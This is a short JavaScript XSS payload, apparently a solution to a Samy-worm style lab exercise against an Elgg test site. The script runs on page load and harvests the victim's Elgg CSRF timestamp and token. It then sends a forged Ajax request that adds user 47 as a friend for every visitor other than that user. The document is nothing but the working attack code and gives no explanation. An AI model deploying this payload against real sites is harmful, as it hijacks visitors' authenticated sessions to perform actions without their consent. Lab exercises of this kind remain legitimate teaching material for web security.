


<script type="text/javascript">



	window.onload = function () {
	var Ajax=null;
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var fid="friend=47"
	//Construct the HTTP request to add Samy as a friend.

	var self_id = elgg.session.user.guid

	if(self_id != 47) {

		var sendurl="http://www.xsslabelgg.com/action/friends/add?"+fid+""+ts+""+token+""+ts+""+token+"" //FILL IN

		//Create and send Ajax request to add friend
		Ajax=new XMLHttpRequest();
		Ajax.open("GET",sendurl,true);
		Ajax.setRequestHeader("Host","www.xsslabelgg.com");
		Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
		Ajax.send();
		}
	}
</script>

